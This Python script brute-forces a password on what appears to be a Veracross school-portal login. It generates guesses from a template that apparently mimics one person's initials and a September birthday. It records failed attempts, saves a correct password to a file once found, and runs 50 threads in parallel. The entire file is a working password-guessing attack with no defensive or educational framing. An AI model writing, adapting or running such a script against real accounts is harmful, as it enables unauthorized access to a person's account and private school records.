import random
from threading import Thread
import os
from requestPage import request_page
from resquest_veracross_page import request_pass_veracross
import time

# chars = "ls"
num = "1234567890"
chars = "qwertyuiopasdfghjklzxcvbnm"
char_first = "j"

def main():
    while True:
        if "correct_pass.txt" in os.listdir():
            break
        valid = False
        while not valid:
            # randomPassword = random.choices(chars, k = 8)
            # randomPassword = "".join(randomPassword)

            oneLetters = random.choices(chars, k = 1)
            twoNumbers = random.choices(num, k = 2)
            # twoNumbers2 = random.choices(num, k = 2)
            rl= char_first, "".join(oneLetters)
            rl = "".join(rl)
            rn = "".join(twoNumbers)
            rn2 = "09"

            randomPassword = [rl,rl,rn,rn2]
            randomPassword = "".join(randomPassword)

            file = open("tries.txt", "r")
            tries = file.read()
            file.close()

            if(int(rn) >= 32):
                pass
            elif(int(rn2) >= 13):
                pass
            elif randomPassword in tries:
                pass
            else:
                valid = True


        valid_request = False
        while valid_request == False:
            r = request_pass_veracross(randomPassword)
            if(r == "error"):
                print("Error!")
                time.sleep(100)
                valid_request = False
            else:
                print("pass")
                valid_request = True

        print("=======")
        print(r.status_code)
        if (r.status_code != 200):
            with open("tries.txt", "a") as f:
                f.write(f"{randomPassword}\n")
                f.close()

            print(f"Incorrect {randomPassword}\n")
        else:
            with open("correct_pass.txt", "w") as f:
                f.write(f"{randomPassword}\n")

            print(f"Correct {randomPassword}\n")
            break


for x in range(50):
    Thread(target=main).start() 
